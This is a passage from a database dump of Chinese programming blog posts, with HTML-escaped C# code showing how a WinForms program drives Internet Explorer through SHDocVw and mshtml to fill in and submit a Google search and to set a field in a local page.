/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mshtml.IHTMLDocument2 ieDoc;&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ieWnd == null)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ieWnd = new SHDocVw.InternetExplorer();&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ieWnd.Visible = true;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ieWnd.Navigate(&quot;http://www.google.com&quot;, ref missing, ref missing, ref missing, ref missing);&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //wait for loading completed, or using DocumentComplete Event&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (ieWnd.StatusText.IndexOf(&quot;完成&quot;) == -1)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Application.DoEvents();&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ieDoc = (mshtml.IHTMLDocument2)ieWnd.Document;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return ieDoc;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #endregion</p>\r\n\r\n<p>#region Search the given text in google&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///// &lt;summary&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// search the given text in google home page&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// we can see the source file of google home page to confirm the elements we need&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// the html file of google home page is as follows&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;table cellpadding=0 cellspacing=0&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr valign=top&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td width=25%&gt; &lt;/td&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td align=center nowrap&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input name=hl type=hidden value=zh-CN&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input autocomplete=&quot;off&quot; maxlength=2048 name=q size=55 title=&quot;Google 搜索&quot; value=&quot;&quot;&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;br&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input name=btnG type=submit value=&quot;Google 搜索&quot;&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input name=btnI type=submit value=&quot; 手气不错 &quot;&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ...&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///// &lt;/summary&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void SearchTextInGoogle(mshtml.IHTMLDocument2 ieDoc, string searchText)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mshtml.HTMLInputElementClass input;&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //set the text to be searched&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (mshtml.IHTMLElement ieElement in ieDoc.all)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //if its tag is input and name is q(question)&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ieElement.tagName.ToUpper().Equals(&quot;INPUT&quot;))&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; input = ((mshtml.HTMLInputElementClass)ieElement);&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (input.name == &quot;q&quot;)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; input.value = searchText;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //click the submit button to search&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (mshtml.IHTMLElement ieElement in ieDoc.all)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //if its tag is input&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ieElement.tagName.ToUpper().Equals(&quot;INPUT&quot;))&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; input = (mshtml.HTMLInputElementClass)ieElement;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (input.name == &quot;btnG&quot;)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; input.click();&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #endregion &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>参考文章：</p>\r\n\r\n<p>http://blog.csdn.net/livelylittlefish/archive/2008/08/25/2829873.aspx</p>\r\n\r\n<p>http://hi.baidu.com/andyleesoft/blog/item/802e02289fcc1f94023bf66a.html</p>\r\n\r\n<p>http://zhidao.baidu.com/question/48084010.html<br />\r\n来自: http://hi.baidu.com/cwt0408/blog/item/87881fddc199d5205882ddf9.html</p>\r\n',0,1438328086,0,0),(141,38,'.net (c#)winform中操作ie窗口元素','<p>运行 这个winform程序. 在winform的textbox里随便输入一串字符, 点击button, ie窗口中input id=&quot;t1&quot; 的值被改为 winform中textbox的值.</p>\r\n\r\n<p>增加引用dll:<br />\r\nmshtml<br />\r\nc:\\windows\\system32\\SHDocVw.dll</p>\r\n\r\n<p>using System;<br />\r\nusing System.Collections.Generic;<br />\r\nusing System.ComponentModel;<br />\r\nusing System.Data;<br />\r\nusing System.Drawing;<br />\r\nusing System.Text;<br />\r\nusing System.Windows.Forms;<br />\r\nusing System.Runtime.InteropServices;<br />\r\nusing System.Diagnostics;<br />\r\nusing mshtml;<br />\r\nnamespace testWinIE<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; public partial class Form1 : Form<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**//*[DllImport(&quot;user32.dll&quot;)]<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static extern IntPtr FindWindow<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (string sClassName,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string sWindowTitle);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DllImport(&quot;user32.dll&quot;)]<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static extern IntPtr FindWindowEx(<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IntPtr hParent,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IntPtr hNext,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string sClassName,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string sWindowTitle);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DllImport(&quot;user32.dll&quot;)]<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static extern int GetWindowTextLength(IntPtr hTxt);&nbsp;&nbsp; // handle to window or control with text</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DllImport(&quot;user32.dll&quot;)]<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static extern int GetWindowText(IntPtr hWnd,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // handle to window or control with text<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string lpString, // address of buffer for text<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int nMaxCount&nbsp;&nbsp;&nbsp;&nbsp; // maximum number of characters to copy<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );*/</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**//*开始我试图使用调用api的方式来使用c# winform程序与ie窗口进行通信， 是成功了，可以控制ie窗口和标准windows控件，<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * 但是有个问题，控制不了文档区的元素，浪费了我好多时间。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * 我们做windows程序知道，windows下面都是窗口，一个文本框 classname为 Edit，一个button,等等等等.<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * 而在ie的文档区，它却不是，害我用了很多方法浪费时间，包括把16进制编号都用上了，就是查不到。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * ie中的（准确地说，应该是web page中的htmlelement,比如input)它们不是标准windows控件<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * 最后查资料到ms,得到了微软件的实现方法，走了弯路，历时近5个小时，解决了这个问题.<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * fcuandy 2007-12-18<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public Form1()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InitializeComponent();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void Form1_Load(object sender, EventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void test()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //IntPtr ieWin = FindWindow(&quot;IEFrame&quot;, &quot;aaa - Microsoft Internet Explorer&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //IntPtr txtPtr = IntPtr.Zero;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //if (!ieWin.Equals(IntPtr.Zero))<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // MessageBox.Show(&quot;window has been found&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //txtPtr = FindWindowEx(ieWin, IntPtr.Zero, &quot;IEFrame&quot;, null);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //txtPtr = FindWindowEx(ieWin,IntPtr.Zero, &quot;Shell DocObject View&quot;, &quot;&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //txtPtr = FindWindowEx(txtPtr,IntPtr.Zero , &quot;Internet Explorer_Server&quot;, &quot;&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //if (!txtPtr.Equals(IntPtr.Zero))<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**//*<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 获得所有ie进程。因为windows下资源窗口使用ie内核，所以不光是我们通常指的web浏览器，它还包括你打开我的电脑这样的窗口<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SHDocVw.ShellWindows sws = new SHDocVw.ShellWindows();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //SHDocVw.InternetExplorer iw = SHDocVw. new SHDocVw.InternetExplorer();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**//*遍历ie进程*/<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (SHDocVw.InternetExplorer iw in sws)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //MessageBox.Show(iw.LocationName);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**//*<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果使用的窗口中正打开的是我的aaa.html<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * 我这里就没有对窗口类型进行检测了，因为我的aaa.html它一定是ie打开的。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (iw.LocationName == &quot;aaa.html&quot;)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //MessageBox.Show(iw.LocationName);<br 